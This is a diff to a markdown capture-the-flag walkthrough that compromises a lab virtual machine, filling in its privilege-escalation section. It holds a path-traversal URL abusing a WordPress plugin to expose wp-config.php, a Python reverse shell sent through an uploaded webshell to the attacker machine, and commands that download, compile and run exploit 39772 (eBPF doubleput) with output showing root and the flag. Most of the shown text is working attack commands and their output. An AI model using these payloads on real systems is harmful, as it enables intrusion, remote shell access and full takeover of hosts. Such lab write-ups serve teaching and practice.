@@ -901,8 +901,9 @@ elly:x:1029:1029::/home/elly:/bin/bash
 
 Before we fire up a brute force attack, we should check to see if there are any other bits of information we can leverage. Reviewing the WP backup, I noticed there is no wp-config.php only wp-config-sample.php. wp-config.php is where an admin can hard code credentials to manage the dB, a dB we might be able to get access to if we can get root password. We know from earlier root login is possible on the dB, lets try and get the details.
 
-Lets create a new 'image' by going to: 
-```https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php```
+Lets create a new 'image' by going to:
+
+https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
 
 then curling:
 
@@ -1128,7 +1129,7 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 I tend to have the most success with the python and perl shells when dealing with Linux, lets try the py one first:
 
-view-source:https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 We get a connection on our listener: 
 
@@ -1280,7 +1281,7 @@ sysctl: permission denied on key 'net.ipv6.conf.lo.stable_secret'
 This looks a little more solid and has an off system link to PoC code, lets get it
 
 ``` bash
-https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
 sudo python -m SimpleHTTPServer 80
 ```
 
@@ -1289,19 +1290,95 @@ on our victim, lets pull the exploit over with wget
 TODO
 
 this! With outputs
-```
+``` bash
 wget http://192.168.56.1/39772.zip 
-unzip 39772.zip
-cd 39772
-tar -xvf exploit.tar
-cd ebpf_mapfd_doubleput_exploit
+unzip 39772.zip && cd 39772
+```
+outputs the tools:
+```
+Archive:  39772.zip
+   creating: 39772/
+  inflating: 39772/.DS_Store         
+   creating: __MACOSX/
+   creating: __MACOSX/39772/
+  inflating: __MACOSX/39772/._.DS_Store  
+  inflating: 39772/crasher.tar       
+  inflating: __MACOSX/39772/._crasher.tar  
+  inflating: 39772/exploit.tar       
+  inflating: __MACOSX/39772/._exploit.tar  
+```
+Lets unpack the exploit:
+``` bash
+tar -xvf exploit.tar && cd ebpf_mapfd_doubleput_exploit
+```
+gives us
+```
+ebpf_mapfd_doubleput_exploit/
+ebpf_mapfd_doubleput_exploit/hello.c
+ebpf_mapfd_doubleput_exploit/suidhelper.c
+ebpf_mapfd_doubleput_exploit/compile.sh
+ebpf_mapfd_doubleput_exploit/doubleput.c
+```
+and compile:
+``` bash
 bash compile.sh
-./doubleput
-# I AM ROOT!
+```
+returns some minor errors
+```
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+<ontent/uploads/39772/ebpf_mapfd_doubleput_exploit$ ls
+compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper	suidhelper.c
 
 ```
+We don't care! Time to pwn!
+``` bash
+./doubleput
+```
 
-after the transfer, 
+It is working
+
+```
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+```
+
+I AM ROOT!
+``` bash
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+``` 
+
+get the flag
+``` bash
+sudo cat /root/flag.txt
+```
+
+W00tW00t!
+
+```
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+```
 
 ## Poor Peter!
 A little trick I learned from Hack the box is always check to see if you can read the user histories before you do anything. A handy password parsed into a command might just give us a quick way to a user account.
@@ -1440,7 +1517,6 @@ W00tW00t!
 b6b545dc11b7a270f4bad23432190c75162c4a2b
 ```
 
-Ok so that was the easy way.
 
 
 
